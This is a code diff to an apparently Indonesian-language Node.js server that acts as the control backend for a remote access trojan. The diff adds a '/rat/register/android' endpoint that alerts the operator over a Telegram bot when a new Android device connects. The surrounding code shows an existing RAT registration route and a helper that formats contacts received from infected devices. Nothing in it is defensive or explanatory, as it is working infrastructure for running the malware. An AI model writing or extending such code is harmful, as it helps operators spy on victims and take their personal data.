@@ -253,6 +253,26 @@ app.post('/rat/register', async (req, res) => {
     }
 });
 
+// Endpoint for Android RAT to notify connection
+app.post('/rat/register/android', async (req, res) => {
+    try {
+        const { deviceId } = req.body;
+        if (!deviceId) {
+            return res.status(400).json({ message: 'Missing deviceId in request body' });
+        }
+
+        // Notify the admin
+        const notificationMessage = `📱 **Perangkat Android Baru Terhubung!**\n\nID Perangkat: \`${deviceId}\`\n\nAnda sekarang dapat mengelolanya dari menu Awan Premium.`;
+        await bot.sendMessage(config.adminId, notificationMessage, { parse_mode: 'Markdown' });
+
+        res.status(200).json({ message: 'Notification sent successfully' });
+
+    } catch (error) {
+        console.error("Error in /rat/register/android:", error);
+        res.status(500).send('Internal Server Error');
+    }
+});
+
 // Helper function to format contacts data
 function formatContacts(data) {
     let message = 'Kontak yang Diterima:\n\n';
